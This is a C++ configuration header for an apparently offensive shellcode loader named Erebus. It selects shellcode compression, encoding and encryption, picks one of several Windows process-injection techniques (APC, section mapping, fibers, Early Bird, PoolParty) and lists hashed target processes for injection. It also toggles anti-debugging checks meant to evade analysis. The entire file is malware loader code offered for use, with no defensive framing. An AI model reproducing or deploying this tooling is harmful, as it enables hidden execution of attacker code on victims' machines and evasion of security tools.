#ifndef EREBUS_CONFIG
#define EREBUS_CONFIG
#pragma once

// ============================================
// COMPRESSION CONFIGURATION
// ============================================

// Compression method used for shellcode:
// 0 = NONE        - No decompression
// 1 = LZNT1       - LZNT1 compression
// 2 = RLE         - Run-Length Encoding
#define CONFIG_COMPRESSION_TYPE 0
#if CONFIG_COMPRESSION_TYPE == 1
#define DecompressShellcode erebus::DecompressionLZNT
#elif CONFIG_COMPRESSION_TYPE == 2
#define DecompressShellcode erebus::DecompressionRLE
#endif

// ============================================
// ENCODING CONFIGURATION
// ============================================

// Encoding method used for shellcode:
// 0 = NONE        - No decoding
// 1 = BASE64      - Base64 encoding
// 2 = ASCII85     - ASCII85 encoding
// 3 = ALPHA32     - ALPHA32 encoding
// 4 = WORDS256    - WORDS256 encoding
#define CONFIG_ENCODING_TYPE 0
#if CONFIG_ENCODING_TYPE == 1
#define DecodeShellcode erebus::DecodeBase64
#elif CONFIG_ENCODING_TYPE == 2
#define DecodeShellcode erebus::DecodeASCII85
#elif CONFIG_ENCODING_TYPE == 3
#define DecodeShellcode erebus::DecodeALPHA32
#elif CONFIG_ENCODING_TYPE == 4
#define DecodeShellcode erebus::DecodeWORDS256
#endif

// ============================================
// ENCRYPTION CONFIGURATION
// ============================================

// Encryption method used for shellcode:
// 0 = NONE        - No decryption
// 1 = XOR         - Simple XOR cipher
// 2 = RC4         - RC4 stream cipher
// 3 = AES_ECB     - AES in ECB mode
// 4 = AES_CBC     - AES in CBC mode
#ifndef CONFIG_ENCRYPTION_TYPE
#define CONFIG_ENCRYPTION_TYPE 0
#endif

#ifndef CONFIG_ENCRYPTION_KEY
#define CONFIG_ENCRYPTION_KEY { 0x00 }
#endif

#ifndef CONFIG_ENCRYPTION_IV
#define CONFIG_ENCRYPTION_IV { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }
#endif

// ============================================
// INJECTION CONFIGURATION
// ============================================

// Target process for remote injection
#ifndef CONFIG_TARGET_PROCESS
#endif

// Injection technique:
// 1 = NtQueueApcThread    - APC injection to suspended thread (Remote)
// 2 = NtMapViewOfSection  - Section mapping injection (Remote)
// 3 = CreateFiber         - Fiber-based execution (Self) - requires shellcode ABI compliance
// 4 = EarlyCascade        - Early Bird APC injection (Remote)
// 5 = PoolParty           - Worker Factory thread pool injection (Remote)
#ifndef CONFIG_INJECTION_TYPE
#define CONFIG_INJECTION_TYPE 5
#endif

#if CONFIG_INJECTION_TYPE == 1 || CONFIG_INJECTION_TYPE == 2 || CONFIG_INJECTION_TYPE == 4
#define CONFIG_TARGET_PROCESS L"C:\\Windows\\System32\\notepad.exe"
#define CONFIG_INJECTION_MODE 1  // Remote injection (Create Suspended)
#elif CONFIG_INJECTION_TYPE == 3
#define CONFIG_INJECTION_MODE 2  // Self injection
#elif  CONFIG_INJECTION_TYPE == 5
#define CONFIG_TARGET_PROCESS \
            erebus::HashStringFowlerNollVoVariant1a("RuntimeBroker.exe"), \
            erebus::HashStringFowlerNollVoVariant1a("fontdrvhost.exe"), \
            erebus::HashStringFowlerNollVoVariant1a("dllhost.exe"), \
            erebus::HashStringFowlerNollVoVariant1a("Spotify.exe"), \
            erebus::HashStringFowlerNollVoVariant1a("slack.exe"), \
            erebus::HashStringFowlerNollVoVariant1a("PerfWatson2.exe"), \
            erebus::HashStringFowlerNollVoVariant1a("SteelSeriesGG.exe"), \
            erebus::HashStringFowlerNollVoVariant1a("GoogleDriveFS.exe"), \
            erebus::HashStringFowlerNollVoVariant1a("steamwebhelper.exe"), \
            erebus::HashStringFowlerNollVoVariant1a("slpwow64.exe"), \
            erebus::HashStringFowlerNollVoVariant1a("sihost.exe"), \
            erebus::HashStringFowlerNollVoVariant1a("msiexec.exe"), \
            erebus::HashStringFowlerNollVoVariant1a("WerFault.exe"), \
            erebus::HashStringFowlerNollVoVariant1a("werfault.exe"), \
            erebus::HashStringFowlerNollVoVariant1a("devenv.exe"), \
            erebus::HashStringFowlerNollVoVariant1a("cloudflared.exe"), \
            erebus::HashStringFowlerNollVoVariant1a("mrt.exe")
#define CONFIG_INJECTION_MODE 3  // Remote injection (Inject into existing process)
#endif

#if CONFIG_INJECTION_TYPE == 1
#define ExecuteShellcode erebus::InjectionNtQueueApcThread
#elif CONFIG_INJECTION_TYPE == 2
#define ExecuteShellcode erebus::InjectionNtMapViewOfSection
#elif CONFIG_INJECTION_TYPE == 3
#define ExecuteShellcode erebus::InjectionCreateFiber
#elif CONFIG_INJECTION_TYPE == 4
#define ExecuteShellcode erebus::InjectionEarlyCascade
#elif CONFIG_INJECTION_TYPE == 5
#define ExecuteShellcode erebus::InjectionPoolParty
#endif

// ============================================
// GUARDRAILS CONFIGURATION
// ============================================

#include "guardrails/guardrails.hpp"

// Enable/disable guardrails checks at compile time
#ifndef CONFIG_GUARDRAILS_ENABLED
#define CONFIG_GUARDRAILS_ENABLED 0
#endif

#ifndef CONFIG_GUARDRAILS_CHECK_DEBUGGER
#define CONFIG_GUARDRAILS_CHECK_DEBUGGER 0
#endif

#ifndef CONFIG_GUARDRAILS_CHECK_REMOTE_DEBUGGER
#define CONFIG_GUARDRAILS_CHECK_REMOTE_DEBUGGER 0
#endif

#ifndef CONFIG_GUARDRAILS_CHECK_DEBUGGER_PROCESSES
#define CONFIG_GUARDRAILS_CHECK_DEBUGGER_PROCESSES 0
#endif

#ifndef CONFIG_GUARDRAILS_CHECK_HARDWARE_BREAKPOINTS
#define CONFIG_GUARDRAILS_CHECK_HARDWARE_BREAKPOINTS 0
#endif

#ifndef CONFIG_GUARDRAILS_CHECK_TIMING
#define CONFIG_GUARDRAILS_CHECK_TIMING 0
#endif

// Helper function to get configured guardrails
inline erebus::guardrails::GuardrailConfig GetGuardrailConfig() {
    erebus::guardrails::GuardrailConfig config = erebus::guardrails::GetDefaultConfig();
    
    #if CONFIG_GUARDRAILS_ENABLED
        config.check_debugger_present = CONFIG_GUARDRAILS_CHECK_DEBUGGER;
        config.check_remote_debugger = CONFIG_GUARDRAILS_CHECK_REMOTE_DEBUGGER;
        config.check_debugger_processes = CONFIG_GUARDRAILS_CHECK_DEBUGGER_PROCESSES;
        config.check_hardware_breakpoints = CONFIG_GUARDRAILS_CHECK_HARDWARE_BREAKPOINTS;
        config.check_timing_checks = CONFIG_GUARDRAILS_CHECK_TIMING;
    #endif
    
    return config;
}

#endif
